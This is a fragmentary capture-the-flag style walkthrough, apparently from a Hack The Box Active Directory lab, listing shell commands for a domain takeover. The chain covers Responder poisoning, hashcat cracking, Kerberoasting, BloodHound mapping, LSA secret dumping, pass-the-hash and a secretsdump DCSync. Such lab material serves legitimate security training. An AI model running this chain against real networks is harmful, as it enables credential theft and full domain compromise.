...
```shell-session
xF1NN@htb[/htb]$  sudo responder -I eth0 -wrfv
...
```shell-session
xF1NN@htb[/htb]$ hashcat -m 5600 bsmith_hash /usr/share/wordlists/rockyou.txt 
...
```shell-session
xF1NN@htb[/htb]$ GetUserSPNs.py INLANEFREIGHT.LOCAL/bsmith -dc-ip 192.168.195.204
...
```shell-session
xF1NN@htb[/htb]$ sudo bloodhound-python -u 'bsmith' -p '<REDACTED>' -d inlanefreight.local -ns 192.168.195.204 -c All
...
![Diagram showing connection from MSSQLSVC@INLANEFREIGHT.LOCALl to SQL01.INLANEFREIGHT.LOCAL labeled 'AdminTo'.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/162/bh_mssqlsvc.png)
...
```shell-session
xF1NN@htb[/htb]$ GetUserSPNs.py INLANEFREIGHT.LOCAL/bsmith -dc-ip 192.168.195.204 -request-user mssqlsvc
...
```shell-session
xF1NN@htb[/htb]$ $hashcat -m 13100 mssqlsvc_tgs /usr/share/wordlists/rockyou.txt 
...
```shell-session
xF1NN@htb[/htb]$ crackmapexec smb 192.168.195.220 -u mssqlsvc -p <REDACTED> --lsa
...
![Diagram showing connection from PRAMIREZ@INLANEFREIGHT.LOCALl to INLANEFREIGHT.LOCAL with labels 'GetChangesAll' and 'GetChanges'.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/162/bh_pramirez.png)
...
```shell-session
xF1NN@htb[/htb]$ sudo crackmapexec smb 192.168.195.204 -u administrator -H e4axxxxxxxxxxxxxxxx1c88c2e94cba2
...
```shell-session
xF1NN@htb[/htb]$ secretsdump.py inlanefreight/administrator@192.168.195.204 -hashes ad3b435b51404eeaad3b435b51404ee:e4axxxxxxxxxxxxxxxx1c88c2e94cba2 -just-dc-ntlm
